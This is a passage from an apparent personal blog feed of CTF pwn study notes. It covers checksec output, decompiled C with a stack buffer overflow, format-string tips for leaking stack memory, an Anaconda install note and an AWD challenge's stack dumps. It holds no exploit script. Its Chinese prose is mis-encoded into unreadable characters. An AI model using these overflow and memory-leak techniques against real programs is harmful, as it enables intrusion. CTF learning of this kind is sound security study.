class="hljs-string">&#x27;/root/ctf-practice/canary/03/babypie&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/ctf-practice/canary/03]<br>â””â”€<span class="hljs-comment"># file babypie</span><br>babypie: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped<br><br><br></code></pre></td></tr></table></figure><h2 id="åˆ†ææ¼æ´å‡½æ•°-2"><a href="#åˆ†ææ¼æ´å‡½æ•°-2" class="headerlink" title="åˆ†ææ¼æ´å‡½æ•°"></a>åˆ†ææ¼æ´å‡½æ•°</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  sub_960(a1, a2, a3);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_960</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 buf[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br><br>  buf[<span class="hljs-number">5</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your Name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x30</span>uLL);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello %s:\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)buf);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x60</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905122100.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905122112.png" alt="image.png"></p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><h3 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">__int64</span> buf[<span class="hljs-number">6</span>]; <br><span class="hljs-attribute">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);<br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å£°æ˜äº†ä¸€ä¸ªåä¸º <code>buf</code> çš„æ•°ç»„ï¼Œè¯¥æ•°ç»„çš„å…ƒç´ ç±»å‹æ˜¯ <code>__int64</code>ï¼Œå¹¶ä¸”æ•°ç»„çš„å¤§å°ä¸º6ä¸ª <code>__int64</code> å…ƒç´ ã€‚æ¥ç€ï¼Œä½¿ç”¨ <code>memset</code> å‡½æ•°å°†è¿™ä¸ªæ•°ç»„çš„å‰32ä¸ªå­—èŠ‚éƒ½è®¾ç½®ä¸º0ã€‚è¿™é€šå¸¸ç”¨äºç¡®ä¿æ•°ç»„çš„åˆå§‹çŠ¶æ€ï¼Œä»¥é¿å…åŒ…å«æœªåˆå§‹åŒ–çš„æ•°æ®ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfé¢˜ç›®ç³»åˆ—ã€‘ctfwiki pwnç±»å‹ æ ¼å¼åŒ–å­—ç¬¦ä¸²</title>
    <link href="/2023/09/01/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfwiki%20pwn%E7%B1%BB%E5%9E%8B%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <url>/2023/09/01/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfwiki%20pwn%E7%B1%BB%E5%9E%8B%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">ctfwiki-æ ¼å¼åŒ–å­—ç¬¦ä¸²-æ€»å…¥å£</a></p><h1 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h1><h2 id="08x"><a href="#08x" class="headerlink" title="%08x"></a>%08x</h2><p>åœ¨Cè¯­è¨€ä¸­ï¼Œ<code>%08x</code>æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œé€šå¸¸ç”¨äºæ ¼å¼åŒ–è¾“å‡ºæˆ–è¾“å…¥åå…­è¿›åˆ¶æ•°å­—ã€‚å®ƒçš„å«ä¹‰å¦‚ä¸‹ï¼š</p><ul><li><code>%</code>ï¼šè¿™æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„èµ·å§‹æ ‡å¿—ã€‚</li><li><code>0</code>ï¼šè¡¨ç¤ºä½¿ç”¨é›¶å¡«å……å­—æ®µï¼Œå³åœ¨æ•°å­—å‰é¢ç”¨é›¶å¡«å……ï¼Œä»¥è¾¾åˆ°æŒ‡å®šçš„å­—æ®µå®½åº¦ã€‚</li><li><code>8</code>ï¼šè¡¨ç¤ºå­—æ®µå®½åº¦ä¸º8ä¸ªå­—ç¬¦ï¼ŒåŒ…æ‹¬å¡«å……çš„é›¶å’Œåå…­è¿›åˆ¶æ•°å­—ã€‚</li><li><code>x</code>ï¼šè¡¨ç¤ºä»¥åå…­è¿›åˆ¶æ ¼å¼è¾“å‡ºæ•´æ•°ã€‚</li></ul><p>å› æ­¤ï¼Œ<code>%08x</code>ç”¨äºä»¥å…«ä¸ªå­—ç¬¦çš„å®½åº¦ï¼Œä½¿ç”¨é›¶å¡«å……çš„æ–¹å¼è¾“å‡ºä¸€ä¸ªæ•´æ•°çš„åå…­è¿›åˆ¶è¡¨ç¤ºã€‚å¦‚æœæ•´æ•°çš„åå…­è¿›åˆ¶è¡¨ç¤ºä¸è¶³8ä¸ªå­—ç¬¦ï¼Œå°†åœ¨å‰é¢ç”¨é›¶å¡«å……ã€‚è¿™ç§æ ¼å¼é€šå¸¸ç”¨äºç¡®ä¿è¾“å‡ºçš„åå…­è¿›åˆ¶æ•°å…·æœ‰ä¸€è‡´çš„å®½åº¦ï¼Œä¾¿äºé˜…è¯»å’Œæ¯”è¾ƒã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> num = <span class="hljs-number">42</span>; <span class="hljs-comment">// å‡è®¾ä½ æœ‰ä¸€ä¸ªæ•´æ•°</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x&quot;</span>, num); <span class="hljs-comment">// æ‰“å°æ•´æ•°numçš„åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œç¡®ä¿å®½åº¦ä¸º8ä¸ªå­—ç¬¦</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œ<code>num</code>æ˜¯ä¸€ä¸ªæ•´æ•°å˜é‡ï¼Œ<code>printf</code>å‡½æ•°å°†ä¼šå°†å…¶æ ¼å¼åŒ–ä¸ºä¸€ä¸ª8ä¸ªå­—ç¬¦å®½åº¦çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¹¶åœ¨å‰é¢ç”¨é›¶å¡«å……ï¼Œç„¶åå°†ç»“æœæ‰“å°å‡ºæ¥ã€‚</p><h2 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h2><p>printf(â€œ%pâ€,a) ç”¨åœ°å€çš„æ ¼å¼æ‰“å°å˜é‡ a çš„å€¼<br>printf(â€œ%pâ€, &amp;a) æ‰“å°å˜é‡ a æ‰€åœ¨çš„åœ°å€ã€‚</p><h2 id="3-x"><a href="#3-x" class="headerlink" title="%3$x"></a>%3$x</h2><p>åœ¨Cè¯­è¨€çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­ï¼Œ%3$xè¡¨ç¤ºä½¿ç”¨å‚æ•°åˆ—è¡¨ä¸­çš„ç¬¬3ä¸ªå‚æ•°ï¼Œå¹¶ä»¥åå…­è¿›åˆ¶æ ¼å¼æ‰“å°å®ƒã€‚è¿™æ˜¯ä¸€ç§æ ¼å¼åŒ–è¾“å‡ºçš„æ–¹å¼ï¼Œé€šå¸¸åœ¨å¤„ç†å¤šä¸ªå‚æ•°çš„æƒ…å†µä¸‹ä½¿ç”¨ã€‚</p><ul><li><code>%</code>ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„èµ·å§‹æ ‡å¿—ã€‚</li><li><code>3$</code>ï¼šè¡¨ç¤ºä½¿ç”¨å‚æ•°åˆ—è¡¨ä¸­çš„ç¬¬3ä¸ªå‚æ•°ã€‚</li><li><code>x</code>ï¼šè¡¨ç¤ºä»¥åå…­è¿›åˆ¶æ ¼å¼è¾“å‡ºå‚æ•°çš„å€¼ã€‚</li></ul><p>ä¾‹å¦‚ï¼Œè€ƒè™‘ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> b = <span class="hljs-number">20</span>;<br><span class="hljs-type">int</span> c = <span class="hljs-number">30</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$x\n&quot;</span>, a, b, c);<br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œ%3$xå°†ä¼šæ‰“å°å‚æ•°åˆ—è¡¨ä¸­çš„ç¬¬3ä¸ªå‚æ•° cï¼ˆå®ƒçš„å€¼æ˜¯30ï¼‰çš„åå…­è¿›åˆ¶è¡¨ç¤ºã€‚æ‰€ä»¥è¾“å‡ºå°†æ˜¯ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">1e<br></code></pre></td></tr></table></figure><p>è¯·æ³¨æ„ï¼Œä½¿ç”¨%3$xè¿™æ ·çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å¯ä»¥å¾ˆæœ‰ç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†å¤šä¸ªå‚æ•°çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€‰æ‹©æ€§åœ°é€‰æ‹©è¦æ‰“å°çš„å‚æ•°ï¼Œä»¥åŠä»¥ä¸åŒçš„æ ¼å¼æ‰“å°å®ƒä»¬ã€‚</p><h2 id="isoc99-scanf-â€œ-6sâ€-format"><a href="#isoc99-scanf-â€œ-6sâ€-format" class="headerlink" title="__isoc99_scanf(â€œ%6sâ€, format);"></a>__isoc99_scanf(â€œ%6sâ€, format);</h2><p>ä½¿ç”¨<code>scanf</code>ä»è¾“å…¥ä¸­è¯»å–æœ€å¤š6ä¸ªå­—ç¬¦ï¼Œå¹¶å°†å®ƒä»¬å­˜å‚¨åœ¨åä¸º<code>format</code>çš„å˜é‡ä¸­ã€‚è¾“å…¥å°†åœ¨è¯»å–äº†6ä¸ªå­—ç¬¦æˆ–é‡åˆ°ç©ºç™½å­—ç¬¦ï¼ˆä¾‹å¦‚ç©ºæ ¼æˆ–æ¢è¡Œç¬¦ï¼‰æ—¶åœæ­¢ã€‚</p><h2 id="å°æŠ€å·§æ€»ç»“"><a href="#å°æŠ€å·§æ€»ç»“" class="headerlink" title="å°æŠ€å·§æ€»ç»“"></a><strong>å°æŠ€å·§æ€»ç»“</strong></h2><blockquote><ol><li>åˆ©ç”¨ %x æ¥è·å–å¯¹åº”æ ˆçš„å†…å­˜ï¼Œä½†å»ºè®®ä½¿ç”¨ %pï¼Œå¯ä»¥ä¸ç”¨è€ƒè™‘ä½æ•°çš„åŒºåˆ«ã€‚</li><li>åˆ©ç”¨ %s æ¥è·å–å˜é‡æ‰€å¯¹åº”åœ°å€çš„å†…å®¹ï¼Œåªä¸è¿‡æœ‰é›¶æˆªæ–­ã€‚</li><li>åˆ©ç”¨ %order$x æ¥è·å–æŒ‡å®šå‚æ•°çš„å€¼ï¼Œåˆ©ç”¨ %order$s æ¥è·å–æŒ‡å®šå‚æ•°å¯¹åº”åœ°å€çš„å†…å®¹ã€‚</li></ol></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€pythonç³»åˆ—ã€‘(202308) å®‰è£…anaconda</title>
    <link href="/2023/08/31/software/%E3%80%90python%E7%B3%BB%E5%88%97%E3%80%91(202308)%20%E5%AE%89%E8%A3%85anaconda/"/>
    <url>/2023/08/31/software/%E3%80%90python%E7%B3%BB%E5%88%97%E3%80%91(202308)%20%E5%AE%89%E8%A3%85anaconda/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># uname -a</span><br>Linux ningan 5.4.0-150-generic <span class="hljs-comment">#167~18.04.1-Ubuntu SMP Wed May 24 00:51:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br>[root@ningan ~]<span class="hljs-comment">#</span><br>[root@ningan ~]<span class="hljs-comment"># cat /etc/os-release</span><br>NAME=<span class="hljs-string">&quot;Ubuntu&quot;</span><br>VERSION=<span class="hljs-string">&quot;18.04.6 LTS (Bionic Beaver)&quot;</span><br>ID=ubuntu<br>ID_LIKE=debian<br>PRETTY_NAME=<span class="hljs-string">&quot;Ubuntu 18.04.6 LTS&quot;</span><br>VERSION_ID=<span class="hljs-string">&quot;18.04&quot;</span><br>HOME_URL=<span class="hljs-string">&quot;https://www.ubuntu.com/&quot;</span><br>SUPPORT_URL=<span class="hljs-string">&quot;https://help.ubuntu.com/&quot;</span><br>BUG_REPORT_URL=<span class="hljs-string">&quot;https://bugs.launchpad.net/ubuntu/&quot;</span><br>PRIVACY_POLICY_URL=<span class="hljs-string">&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;</span><br>VERSION_CODENAME=bionic<br>UBUNTU_CODENAME=bionic<br><br></code></pre></td></tr></table></figure><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>Anaconda å®‰è£…åŒ…å¯ä»¥åˆ°Â <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/</a>Â ä¸‹è½½ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">æˆ‘è‡ªå·±çš„ç¯å¢ƒä¸‹è½½çš„æ˜¯è¿™ä¸ªï¼šAnaconda3-2021.05-Linux-x86_64.sh<br>æœ€å¼€å§‹ä¸‹è½½çš„æ˜¯è¿™ä¸ªï¼šAnaconda3-2023.07-2-Linux-x86_64.shï¼Œå®‰è£…ä¸€ç›´æŠ¥é”™<br>ä¸‹å®Œä»¥åæ‰§è¡Œï¼š<br><span class="hljs-comment"># bash Anaconda3-2021.05-Linux-x86_64.sh</span><br></code></pre></td></tr></table></figure><p>æ‰“å¼€æ–°çš„bashå°±èƒ½çœ‹åˆ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(base) [root@ningan ~]<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>åœ¨ubuntuæ–°<a href="https://so.csdn.net/so/search?q=%E5%AE%89%E8%A3%85anaconda&spm=1001.2101.3001.7020">å®‰è£…anaconda</a>ä¹‹åï¼Œæ¯æ¬¡æ‰“å¼€ç»ˆç«¯ï¼Œæ€»æ˜¯æ˜¾ç¤ºæ­£åœ¨ä½¿ç”¨é»˜è®¤anacondaä¸­çš„baseç¯å¢ƒã€‚å…³é—­è‡ªåŠ¨æ‰“å¼€çš„è™šæ‹Ÿç¯å¢ƒï¼Œå¯ä»¥é‡‡ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">conda<span class="hljs-built_in"> config </span>--<span class="hljs-built_in">set</span> auto_activate_base <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>ä¸‹æ¬¡å¦‚æœè¦ä½¿ç”¨anacondaçš„<a href="https://so.csdn.net/so/search?q=%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83&spm=1001.2101.3001.7020">è™šæ‹Ÿç¯å¢ƒ</a>ï¼Œå¯ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ‰“å¼€ç›¸åº”çš„è™šæ‹Ÿç¯å¢ƒï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">conda activate spacename <span class="hljs-regexp">//</span>ç¯å¢ƒçš„åç§°<br>conda activate base<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
    <tags>
      
      <tag>software</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€awdç³»åˆ—ã€‘Bugku S3 AWDæ’ä½èµ›-9 pwnç±»å‹</title>
    <link href="/2023/08/27/ctf/%E3%80%90awd%E7%B3%BB%E5%88%97%E3%80%91Bugku%20S3%20AWD%E6%8E%92%E4%BD%8D%E8%B5%9B-9%20pwn%E7%B1%BB%E5%9E%8B/"/>
    <url>/2023/08/27/ctf/%E3%80%90awd%E7%B3%BB%E5%88%97%E3%80%91Bugku%20S3%20AWD%E6%8E%92%E4%BD%8D%E8%B5%9B-9%20pwn%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="äºŒè¿›åˆ¶"><a href="#äºŒè¿›åˆ¶" class="headerlink" title="äºŒè¿›åˆ¶"></a>äºŒè¿›åˆ¶</h1><p>ä¸‹è½½åœ°å€ï¼š<a href="https://download.csdn.net/download/weixin_42072280/88260531">ä¼ é€é—¨</a></p><h1 id="æ£€æŸ¥åˆ†æ"><a href="#æ£€æŸ¥åˆ†æ" class="headerlink" title="æ£€æŸ¥åˆ†æ"></a>æ£€æŸ¥åˆ†æ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 3rd]<span class="hljs-comment"># file pwn</span><br>pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=b1ddcb889cf95991ae5345be73afb83771de5855, not stripped<br>[root@ningan 3rd]<span class="hljs-comment">#</span><br>[root@ningan 3rd]<span class="hljs-comment"># checksec pwn</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/awd/3rd/pwn&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå®‰å…¨é˜²æŠ¤è¿˜æ˜¯æ¯”è¾ƒå¼±çš„</p><h1 id="è¿è¡ŒäºŒè¿›åˆ¶"><a href="#è¿è¡ŒäºŒè¿›åˆ¶" class="headerlink" title="è¿è¡ŒäºŒè¿›åˆ¶"></a>è¿è¡ŒäºŒè¿›åˆ¶</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 3rd]<span class="hljs-comment"># ./pwn</span><br>Your goal is to call `win` <span class="hljs-keyword">function</span> (located at 0x400861)<br><br>   [ Address ]           [ Stack ]<br>                   +--------------------+<br>0x00007ffd6f5c6950 | 0x00007f4272c70b40 | &lt;-- buf<br>                   +--------------------+<br>0x00007ffd6f5c6958 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffd6f5c6960 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffd6f5c6968 | 0x00007f4272e8b170 |<br>                   +--------------------+<br>0x00007ffd6f5c6970 | 0x00007ffd6f5c6980 | &lt;-- saved rbp (vuln)<br>                   +--------------------+<br>0x00007ffd6f5c6978 | 0x000000000040084e | &lt;-- <span class="hljs-built_in">return</span> address (vuln)<br>                   +--------------------+<br>0x00007ffd6f5c6980 | 0x0000000000400ad0 | &lt;-- saved rbp (main)<br>                   +--------------------+<br>0x00007ffd6f5c6988 | 0x00007f4272890c87 | &lt;-- <span class="hljs-built_in">return</span> address (main)<br>                   +--------------------+<br>0x00007ffd6f5c6990 | 0x0000000000000001 |<br>                   +--------------------+<br>0x00007ffd6f5c6998 | 0x00007ffd6f5c6a68 |<br>                   +--------------------+<br><br>Input: 123456<br><br>   [ Address ]           [ Stack ]<br>                   +--------------------+<br>0x00007ffd6f5c6950 | 0x000a363534333231 | &lt;-- buf<br>                   +--------------------+<br>0x00007ffd6f5c6958 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffd6f5c6960 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffd6f5c6968 | 0x00007f4272e8b170 |<br>                   +--------------------+<br>0x00007ffd6f5c6970 | 0x00007ffd6f5c6980 | &lt;-- saved rbp (vuln)<br>                   +--------------------+<br>0x00007ffd6f5c6978 | 0x000000000040084e | &lt;-- <span class="hljs-built_in">return</span> address (vuln)<br>                   +--------------------+<br>0x00007ffd6f5c6980 | 0x0000000000400ad0 | &lt;-- saved rbp (main)<br>                   +--------------------+<br>0x00007ffd6f5c6988 | 0x00007f4272890c87 | &lt;-- <span class="hljs-built_in">return</span> address (main)<br>                   +--------------------+<br>0x00007ffd6f5c6990 | 0x0000000000000001 |<br>                   +--------------------+<br>0x00007ffd6f5c6998 | 0x00007ffd6f5c6a68 |<br>                   +--------------------+<br><br>Bye!<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 3rd]<span class="hljs-comment"># ./pwn</span><br>Your goal is to call `win` <span class="hljs-keyword">function</span> (located at 0x400861)<br><br>   [ Address ]           [ Stack ]<br>                   +--------------------+<br>0x00007ffe0d6dd760 | 0x00007f02d1bdab40 | &lt;-- buf<br>                   +--------------------+<br>0x00007ffe0d6dd768 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffe0d6dd770 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffe0d6dd778 | 0x00007f02d1df5170 |<br>                   +--------------------+<br>0x00007ffe0d6dd780 | 0x00007ffe0d6dd790 | &lt;-- saved rbp (vuln)<br>                   +--------------------+<br>0x00007ffe0d6dd788 | 0x000000000040084e | &lt;-- <span class="hljs-built_in">return</span> address (vuln)<br>                   +--------------------+<br>0x00007ffe0d6dd790 | 0x0000000000400ad0 | &lt;-- saved rbp (main)<br>                   +--------------------+<br>0x00007ffe0d6dd798 | 0x00007f02d17fac87 | &lt;-- <span class="hljs-built_in">return</span> address (main)<br>                   +--------------------+<br>0x00007ffe0d6dd7a0 | 0x0000000000000001 |<br>                   +--------------------+<br>0x00007ffe0d6dd7a8 | 0x00007ffe0d6dd878 |<br>                   +--------------------+<br><br>Input: aaaaaaaa<br><br>   [ Address ]           [ Stack ]<br>                   +--------------------+<br>0x00007ffe0d6dd760 | 0x6161616161616161 | &lt;-- buf<br>                   +--------------------+<br>0x00007ffe0d6dd768 | 0x000000000000000a |<br>                   +--------------------+<br>0x00007ffe0d6dd770 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffe0d6dd778 | 0x00007f02d1df5170 |<br>                   +--------------------+<br>0x00007ffe0d6dd780 | 0x00007ffe0d6dd790 | &lt;-- saved rbp (vuln)<br>                   +--------------------+<br>0x00007ffe0d6dd788 | 0x000000000040084e | &lt;-- <span class="hljs-built_in">return</span> address (vuln)<br>                   +--------------------+<br>0x00007ffe0d6dd790 | 0x0000000000400ad0 | &lt;-- saved rbp (main)<br>                   +--------------------+<br>0x00007ffe0d6dd798 | 0x00007f02d17fac87 | &lt;-- <span class="hljs-built_in">return</span> address (main)<br>                   +--------------------+<br>0x00007ffe0d6dd7a0 | 0x0000000000000001 |<br>                   +--------------------+<br>0x00007ffe0d6dd7a8 | 0x00007ffe0d6dd878 |<br>                   